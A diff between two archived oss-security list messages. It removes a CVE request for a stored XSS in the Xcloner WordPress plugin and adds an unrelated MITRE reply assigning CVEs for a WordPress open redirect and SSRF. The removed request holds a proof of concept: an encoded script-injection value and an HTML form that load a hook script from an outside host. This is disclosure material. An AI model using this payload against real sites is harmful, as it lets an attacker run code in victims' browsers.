@@ -1,48 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/27/2
-Message-ID: <3626D6E697A150459C44C0E5D8D8D00E0DBE8BDF@EX02.corp.qihoo.net>
-Date: Wed, 27 Jul 2016 02:35:46 +0000
-From: limingxing <limingxing@....cn>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: CVE request : a stored XSS in Xcloner for wordpress
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/04/6
+Message-Id: <20160204211631.71FEE6FC0E9@smtpvmsrv1.mitre.org>
+Date: Thu,  4 Feb 2016 16:16:31 -0500 (EST)
+From: cve-assign@...re.org
+To: carnil@...ian.org
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: CVE Request: WordPress: New 4.4.2 security and maintenance release: SSRF and open redirect vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Hi
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-     I found a stored XSS in Xcloner for wordpress.  The XSS filter can 
-be bypass.
+> https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
+> https://core.trac.wordpress.org/changeset/36444
+> an open redirection attack
 
-     Here is the plugin page
-     https://wordpress.org/plugins/xcloner-backup-and-restore/
-
-     PoC
-
-     In the "Corn setting" page(URL is 
-"http://<target>/wordpress/wp-admin/plugins.php?page=xcloner_show&option=com_cloner&task=config"), 
-set the "Backup name" (corn_bname) like 
-"1%22%3E%3Cscript+src%3Dhttp%3A%2F%2F172.16.146.128%3A3000%2Fhook.js+on"
-
-     <html>
-         <form 
-action="http://<target>/wordpress/wp-admin/plugins.php?page=xcloner_show&option=com_cloner&task=config" 
-method="post">
-             <input type="hidden" name="cron_bname" 
-value="1%22%3E%3Cscript+src%3Dhttp%3A%2F%2F172.16.146.128%3A3000%2Fhook.js+on" 
-/>
-             <input type="submit" name="submit">
-         </form>
-     </html>
+Use CVE-2016-2221.
 
 
-     Fix way
-     Update to version 3.1.5
+> https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
+> https://core.trac.wordpress.org/changeset/36435
+> a possible SSRF for certain local URIs
 
-     Change
+Use CVE-2016-2222.
 
-     https://plugins.trac.wordpress.org/changeset/1456784
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-
-     Could you assign a CVE ID for it?
-
-Chen Ruiqi
-Codesafe Team
+iQIcBAEBCAAGBQJWs761AAoJEL54rhJi8gl5+a8P/2r4EIHLn4GLBvy0o8J0Q9LF
+tz7lvj9j2naZt0eArwCW2wj0hBaNJWfxfN8Hww/RX6AVKsp6YlUw0PfQKH3smDiF
+oG1wyYLvhbn2FmISpuvLfNdki+i9DSv3ZuYi5x2eS39ZeC4WzDZYSEmTRfJF1rP9
+D5kcN4nxFZsroswPQCDy/GVHCs8+ONUAUFflLPcgiQtWbuB2BBnfBuBy2MFKwiaw
+405spJhDn6ol5F8Y0BQLbZUIlbFMhJxuuiZae2CviNgO1gTEvAJqBCT6g9HaUaW+
+R/XQsGBX2TZC+RZBvhNdBvMdv7iv/imahfObfaGgadmdgRCwq4vegDqqk8pIfNS1
+B4O0Oh2ClL2mg8zAVVPm4z+StG3OjA5IRixBeJje27iPFp2qFNO0DANr42xkANJd
+WReaqq++uwKwEI4Gkp9o0uJTMhFzPcotu8p4fxBikqp0M6KnaM5O667G2l+oz6E7
+kHejuDazRW90RMEtmSlejyNcJLeNXoWMjugGYsJtD89izHODCAgZtIZl0BGfOsbk
+MiEFSaGWqIBPkv2FRx6bowLoEkFnIXaurCXT+x2+3GPpcITFXNDQa0gb/hQHSwQ7
+iufOeraxVFl/bMZmeioZXrhgynWA0kPxWSl5Hd5Yb2P+GpqkC92CTiqo6aKWXZnC
+Hsh1G31WLW/lrVfH1yFc
+=18yk
+-----END PGP SIGNATURE-----
